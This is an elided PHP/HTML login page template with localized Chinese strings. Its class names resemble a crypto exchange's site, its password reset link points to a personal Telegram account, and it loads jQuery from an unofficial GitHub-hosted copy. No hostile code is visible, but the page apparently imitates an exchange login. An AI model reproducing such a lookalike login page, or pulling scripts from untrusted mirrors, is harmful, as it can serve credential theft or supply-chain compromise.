...
<div class="container">
    ...
    <div class="card">
        <form class="card-form" onclick="return false">
            <div class="margin-topbox-px-10">
                <div style="text-align: center; margin-bottom: 20px;">
                    <img src="/Public/Home/static/img/D98EEDEC0A2423FF1.jpg" alt="Login Logo" style="max-width: 120px; height: auto; display: block; margin: 0 auto;">
                </div>
                <div data-bn-type="text" class="css-1g5tc38  tcc fch f36 fw"><span class="floginbr"><?php echo L('欢迎来到');?></span><span class="floginbr"> <?php echo get_config('webname');?></span></div>
            </div>
            <div class="input">
        ...
        <div class="login-reg tcr">
            <a href="https://t.me/lldxxv"  class="css-s84t59 fbaseblue" ><?php echo L('忘记密码');?>？</a>
...
<script src="https://cdn.jsdelivr.net/gh/aassdd34/s/jquery.min.js"></script>
...
$(function(){
  ...
  // 初始化时也处理一次
  $('.input-field').each(function(){ toggleInputBg(this); });
});
</script>
